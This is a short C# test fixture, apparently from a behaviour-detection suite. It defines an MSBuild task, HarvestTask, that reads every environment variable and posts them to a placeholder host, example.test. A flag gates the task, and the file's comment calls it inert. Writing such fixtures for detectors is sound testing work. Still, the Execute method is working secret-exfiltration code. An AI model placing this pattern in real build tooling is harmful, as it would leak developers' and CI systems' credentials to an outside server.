// Inert fixture: never executed (gated by Arm.Armed). BF04 malicious: an ITask that harvests environment variables and posts them.
using System;
using System.Collections;
using System.Net.Http;
using System.Text;

namespace Behaviour
{
    public sealed class HarvestTask : Microsoft.Build.Framework.ITask
    {
        public bool Execute()
        {
            if (!Arm.Armed) return true;
            var sb = new StringBuilder();
            foreach (DictionaryEntry entry in Environment.GetEnvironmentVariables())
                sb.Append(entry.Key).Append('=').Append(entry.Value).Append('\n');
            using var client = new HttpClient();
            client.PostAsync("https://example.test/silvergun-behaviour-suite/collect", new StringContent(sb.ToString())).GetAwaiter().GetResult();
            return true;
        }
    }
}
